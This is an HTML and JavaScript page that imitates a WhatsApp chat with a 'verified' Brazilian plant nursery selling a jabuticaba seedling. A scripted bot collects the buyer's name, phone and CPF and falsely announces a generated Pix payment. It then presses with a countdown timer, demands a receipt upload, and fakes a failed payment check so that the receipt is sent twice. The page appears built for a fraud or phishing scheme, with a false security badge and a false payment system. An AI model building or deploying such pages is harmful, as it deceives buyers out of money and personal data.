<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Viveiro Botanique&Owem</title>

<style>
*{box-sizing:border-box}
body{margin:0;font-family:Arial,Helvetica,sans-serif;height:100vh;overflow:hidden;background:#e5ddd5}
.chat-screen{width:100%;height:100vh;display:flex;flex-direction:column;background:#efe7dd;position:relative;overflow:hidden}
.chat-screen::before{content:"";position:absolute;inset:0;background-image:radial-gradient(circle at 18px 22px,rgba(0,0,0,.035) 2px,transparent 3px),radial-gradient(circle at 85px 75px,rgba(0,0,0,.025) 2px,transparent 4px);background-size:115px 115px;opacity:.45}
.chat-header{height:72px;background:#075e54;color:white;display:flex;align-items:center;padding:10px 14px;gap:10px;z-index:2}
.back{font-size:34px}
.avatar{width:46px;height:46px;border-radius:50%;background:#fff;display:flex;align-items:center;justify-content:center;font-size:24px}
.header-info{flex:1}
.header-title{font-size:16px;font-weight:700;display:flex;gap:5px;align-items:center}
.verified{width:15px;height:15px;border-radius:50%;background:#34b7f1;color:#fff;font-size:10px;display:inline-flex;align-items:center;justify-content:center}
.header-sub{font-size:13px;opacity:.9;margin-top:2px}
.header-icons{display:flex;gap:18px;font-size:22px}
.chat-body{flex:1;padding:16px 12px 24px;overflow-y:auto;position:relative;z-index:1}
.security-msg{max-width:92%;margin:0 auto 18px;background:#fff3c4;color:#4a3d14;border-radius:8px;padding:10px 12px;font-size:13px;text-align:center}
.bot-msg{background:white;color:#1f2937;padding:10px 12px;border-radius:8px 8px 8px 2px;max-width:84%;margin-bottom:8px;font-size:15px;line-height:1.38;box-shadow:0 1px 1px rgba(0,0,0,.08);animation:pop .25s ease}
@keyframes pop{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
.bot-name{color:#128c7e;font-weight:700;font-size:13px;margin-bottom:4px}
.time{display:block;text-align:right;font-size:11px;color:#8b8b8b;margin-top:4px}
.typing-box{background:white;padding:11px 13px;border-radius:8px 8px 8px 2px;max-width:70px;margin-bottom:8px}
.typing{display:flex;gap:4px}
.typing span{width:6px;height:6px;background:#9ca3af;border-radius:50%;animation:blink 1.2s infinite}
.typing span:nth-child(2){animation-delay:.2s}
.typing span:nth-child(3){animation-delay:.4s}
@keyframes blink{0%,80%,100%{opacity:.3}40%{opacity:1}}
.form-card{background:#fff;border-radius:12px;padding:14px;margin-top:10px;max-width:94%;box-shadow:0 2px 8px rgba(0,0,0,.08);animation:pop .25s ease}
.form-label{font-weight:800;font-size:14px;color:#374151;margin-bottom:8px}
.form-input{width:100%;border:1px solid #d1d5db;border-radius:10px;padding:14px;font-size:16px;outline:none}
.form-input:focus{border-color:#128c7e}
.confirm-btn{margin-top:12px;width:100%;border:0;border-radius:999px;padding:16px;background:#25d366;color:white;font-weight:900;font-size:16px;cursor:pointer;box-shadow:0 4px 12px rgba(37,211,102,.38)}
.option-btn{width:100%;border:1px solid #d1fae5;background:#ecfdf5;color:#065f46;font-weight:800;border-radius:12px;padding:14px;margin-top:8px;font-size:15px;text-align:left;cursor:pointer}
.receipt{background:#fff8dc;border:1px dashed #c8a951;border-radius:8px;padding:14px;max-width:94%;font-family:"Courier New",monospace;font-size:14px;line-height:1.45;box-shadow:0 2px 8px rgba(0,0,0,.08);margin-top:10px}
.receipt-title{text-align:center;font-weight:900;margin-bottom:8px}
.total{font-size:18px;font-weight:900}
.safe-pay{margin-top:10px;background:#fff7ed;border:1px solid #fed7aa;color:#9a3412;padding:10px;border-radius:10px;font-size:13px;font-weight:800;text-align:center}
.alert{background:#fff7ed;border:1px solid #fed7aa;color:#9a3412;border-radius:12px;padding:12px;margin-top:10px;font-size:14px;font-weight:700;animation:pulse 1.3s infinite}
@keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.015)}100%{transform:scale(1)}}
.timer{text-align:center;background:#fee2e2;color:#991b1b;border-radius:12px;padding:12px;font-weight:900;font-size:18px;margin-top:10px}
.fake-upload{display:none}
.upload-label{margin-top:12px;width:100%;border-radius:999px;padding:16px;background:#25d366;color:white;font-weight:900;font-size:16px;cursor:pointer;text-align:center;display:block}
@media(min-width:700px){
body{display:flex;justify-content:center;align-items:center;background:#f3f4f6}
.chat-screen{max-width:420px;height:92vh;border-radius:22px;box-shadow:0 20px 45px rgba(0,0,0,.18)}
}
</style>
</head>

<body>

<div class="chat-screen">
  <div class="chat-header">
    <div class="back">‹</div>
    <div class="avatar">🌱</div>
    <div class="header-info">
      <div class="header-title">
        Viveiro Botanique&Owem
        <span class="verified">✓</span>
      </div>
      <div class="header-sub">Thays • reservas e vendas</div>
    </div>
    <div class="header-icons">
      <span>☎</span>
      <span>⋮</span>
    </div>
  </div>

  <div class="chat-body" id="chat">
    <div class="security-msg">
      🔒 Atendimento seguro para reserva da sua muda.
    </div>
  </div>
</div>

<script>
const chat=document.getElementById("chat");

let dados={
  nomeCompleto:"",
  telefone:"",
  horario:"",
  cpf:"",
  cidade:"Sua cidade"
};

function hora(){
  return new Date().toLocaleTimeString("pt-BR",{hour:"2-digit",minute:"2-digit"});
}

function scrollBottom(){
  chat.scrollTop=chat.scrollHeight;
}

function typing(){
  const box=document.createElement("div");
  box.className="typing-box";
  box.innerHTML='<div class="typing"><span></span><span></span><span></span></div>';
  chat.appendChild(box);
  scrollBottom();
  return box;
}

function addMsg(text,name=false){
  const msg=document.createElement("div");
  msg.className="bot-msg";
  msg.innerHTML=`
    ${name ? '<div class="bot-name">Thays - Reservas</div>' : ''}
    ${text}
    <span class="time">${hora()}</span>
  `;
  chat.appendChild(msg);
  scrollBottom();
}

function botSequence(items,callback){
  let i=0;
  function next(){
    if(i>=items.length){
      if(callback) callback();
      return;
    }
    const load=typing();
    setTimeout(()=>{
      load.remove();
      addMsg(items[i].text,items[i].name || false);
      i++;
      setTimeout(next,450);
    },items[i].delay || 850);
  }
  next();
}

function onlyNumbers(v){
  return v.replace(/\D/g,"");
}

function maskPhone(v){
  v=onlyNumbers(v).slice(0,11);
  if(v.length<=2)return v;
  if(v.length<=7)return v.replace(/(\d{2})(\d+)/,"$1 $2");
  return v.replace(/(\d{2})(\d{5})(\d{0,4})/,"$1 $2-$3");
}

function maskCPF(v){
  v=onlyNumbers(v).slice(0,11);
  return v
    .replace(/(\d{3})(\d)/,"$1.$2")
    .replace(/(\d{3})(\d)/,"$1.$2")
    .replace(/(\d{3})(\d{1,2})$/,"$1-$2");
}

function addNameForm(next){
  const card=document.createElement("div");
  card.className="form-card";
  card.innerHTML=`
    <div class="form-label">Nome completo</div>

    <input class="form-input first-name" type="text" placeholder="Digite seu nome" style="margin-bottom:10px;" />

    <input class="form-input last-name" type="text" placeholder="Digite seu sobrenome" />

    <button class="confirm-btn">Confirmar</button>
  `;
  chat.appendChild(card);
  scrollBottom();

  const first=card.querySelector(".first-name");
  const last=card.querySelector(".last-name");
  const btn=card.querySelector("button");

  first.focus();

  btn.onclick=()=>{
    if(!first.value.trim()){
      first.style.borderColor="#dc2626";
      first.focus();
      return;
    }

    if(!last.value.trim()){
      last.style.borderColor="#dc2626";
      last.focus();
      return;
    }

    dados.nomeCompleto=first.value.trim()+" "+last.value.trim();

    card.remove();
    next();
  };
}

function addForm(label,placeholder,key,next,type="text"){
  const card=document.createElement("div");
  card.className="form-card";
  card.innerHTML=`
    <div class="form-label">${label}</div>
    <input class="form-input" type="text" placeholder="${placeholder}" />
    <button class="confirm-btn">Confirmar</button>
  `;
  chat.appendChild(card);
  scrollBottom();

  const input=card.querySelector("input");
  const btn=card.querySelector("button");
  input.focus();

  if(type==="phone"){
    input.addEventListener("input",()=>input.value=maskPhone(input.value));
  }

  btn.onclick=()=>{
    if(!input.value.trim()){
      input.style.borderColor="#dc2626";
      input.focus();
      return;
    }

    if(type==="phone" && onlyNumbers(input.value).length<10){
      input.style.borderColor="#dc2626";
      input.focus();
      return;
    }

    dados[key]=input.value.trim();
    card.remove();
    next();
  };
}

function addOptions(){
  const card=document.createElement("div");
  card.className="form-card";
  card.innerHTML=`
    <div class="form-label">Escolha o melhor horário:</div>

    <button class="option-btn" data-horario="Até 11h da manhã">
      🚚 Até 11h da manhã<br>
      <small>Entrega prioritária grátis</small>
    </button>

    <button class="option-btn" data-horario="Até 18h">
      🚚 Até 18h<br>
      <small>Entrega grátis — mais escolhido</small>
    </button>
  `;
  chat.appendChild(card);
  scrollBottom();

  card.querySelectorAll("button").forEach(btn=>{
    btn.onclick=()=>{
      dados.horario=btn.dataset.horario;
      card.remove();
      stepLote();
    };
  });
}

function addReceipt(){
  const receipt=document.createElement("div");
  receipt.className="receipt";
  receipt.innerHTML=`
    <div class="receipt-title">🧾 RESUMO DA RESERVA</div>
    VIVEIRO BOTANIQUE&OWEM<br>
    Reservas e entregas<br>
    ------------------------------<br>
    Cliente: ${dados.nomeCompleto}<br>
    Telefone: ${dados.telefone}<br>
    Produto: Muda Jabuticaba <b>PRODUZINDO</b><br>
    Entrega: ${dados.cidade}<br>
    Horário: ${dados.horario}<br>
    Entrega pela loja: GRÁTIS<br>
    ------------------------------<br>
    <span class="total">TOTAL: R$ 37,90</span><br>
    ------------------------------
  `;
  chat.appendChild(receipt);
  scrollBottom();
}

function addPaymentForm(){
  const card=document.createElement("div");
  card.className="form-card";
  card.innerHTML=`
    <div class="form-label">CPF para emissão de nota fiscal</div>
    <input class="form-input cpf-input" type="text" placeholder="000.000.000-00" />

    <button class="confirm-btn">🟢 PAGAR PEDIDO AGORA</button>

    <div class="safe-pay">
      🔒 Pagamento seguro via OWEM PAY<br>
      Sistema de Pagamentos Online
    </div>
  `;
  chat.appendChild(card);
  scrollBottom();

  const input=card.querySelector(".cpf-input");
  const btn=card.querySelector("button");

  input.addEventListener("input",()=>input.value=maskCPF(input.value));

  btn.onclick=()=>{
    if(onlyNumbers(input.value).length!==11){
      input.style.borderColor="#dc2626";
      input.focus();
      return;
    }

    dados.cpf=input.value.trim();
    card.remove();
    stepPix();
  };
}

function addUpload(){
  const card=document.createElement("div");
  card.className="form-card";
  card.innerHTML=`
    <div class="timer" id="timer">08:00</div>

    <div class="alert">
      ⚠️ Envie o comprovante aqui para liberarmos sua reserva.
      Sem o envio, a confirmação pode atrasar sua entrega de amanhã.
    </div>

    <label class="upload-label">
      📎 Enviar comprovante
      <input class="fake-upload" type="file" accept="image/*,.pdf" />
    </label>
  `;
  chat.appendChild(card);
  scrollBottom();

  startTimer();

  const upload=card.querySelector("input");

  upload.onchange=()=>{
    card.remove();
    stepIdentificando();
  };
}

function addUploadAgain(){
  const card=document.createElement("div");
  card.className="form-card";
  card.innerHTML=`
    <div class="form-label">Envie novamente o comprovante</div>

    <label class="upload-label">
      📎 Fazer upload do comprovante
      <input class="fake-upload" type="file" accept="image/*,.pdf" />
    </label>
  `;
  chat.appendChild(card);
  scrollBottom();

  const upload=card.querySelector("input");

  upload.onchange=()=>{
    card.remove();
    stepFinal();
  };
}

function startTimer(){
  let seconds=8*60;
  const timer=document.getElementById("timer");

  const interval=setInterval(()=>{
    seconds--;

    const min=String(Math.floor(seconds/60)).padStart(2,"0");
    const sec=String(seconds%60).padStart(2,"0");

    if(timer) timer.textContent=`${min}:${sec}`;
    if(seconds<=0) clearInterval(interval);
  },1000);
}

function start(){
  botSequence([
    {
      text:"Oi, tudo bem? 😊<br><br>Estamos separando as mudas da rota de entrega de amanhã da sua região.",
      name:true,
      delay:900
    },
    {
      text:"Pra garantir sua muda produzindo, preciso confirmar algumas informações do pedido 🌱",
      delay:850
    },
    {
      text:"Por favor, preencha seu nome completo abaixo:",
      delay:700
    }
  ],()=>{
    addNameForm(stepTelefone);
  });
}

function stepTelefone(){
  botSequence([
    {
      text:`Perfeito, ${dados.nomeCompleto.split(" ")[0]} 👍`,
      delay:600
    },
    {
      text:"Agora informe o telefone que devemos usar para acompanhar sua entrega:",
      delay:700
    }
  ],()=>{
    addForm("Telefone / WhatsApp","11 99999-9999","telefone",stepHorario,"phone");
  });
}

function stepHorario(){
  botSequence([
    {
      text:"Certo. Agora escolha o melhor horário para receber amanhã:",
      delay:750
    }
  ],()=>{
    addOptions();
  });
}

function stepLote(){
  botSequence([
    {text:"Perfeito 👍",delay:500},
    {text:"Esse é o lote disponível no momento 🌱",delay:700},
    {text:"Todas as mudas já vão produzindo e com frutos. Após o pagamento, enviamos fotos reais da sua muda pelo WhatsApp antes da entrega.",delay:900}
  ],stepResumo);
}

function stepResumo(){
  addReceipt();

  botSequence([
    {text:"Sua reserva está quase pronta.",delay:700},
    {text:"Para finalizar, informe o CPF para nota fiscal e clique no botão de pagamento abaixo:",delay:800}
  ],addPaymentForm);
}

function stepPix(){
  botSequence([
    {text:"✅ Pix gerado com sucesso.",delay:700},
    {text:"Sua reserva está aguardando confirmação de pagamento.",delay:700},
    {text:"É muito importante enviar o comprovante aqui para tirarmos sua muda da separação da loja. Sem isso, sua entrega de amanhã pode atrasar.",delay:1000}
  ],addUpload);
}

function stepIdentificando(){
  botSequence([
    {text:"🔎 Identificando pagamento...",delay:700}
  ],()=>{
    const load=typing();

    setTimeout(()=>{
      load.remove();

      botSequence([
        {text:"O sistema ainda não identificou o pagamento automaticamente.",delay:700},
        {text:"Por favor, envie novamente o comprovante abaixo para nossa equipe validar sua reserva.",delay:800}
      ],addUploadAgain);

    },5000);
  });
}

function stepFinal(){
  botSequence([
    {text:"✅ Comprovante recebido com sucesso.",delay:700},
    {text:"Sua reserva está confirmada 🌱",delay:700},
    {text:"Vamos entrar em contato agora pelo seu WhatsApp para confirmar os detalhes da entrega.",delay:850}
  ]);
}

start();
</script>

</body>
</html>
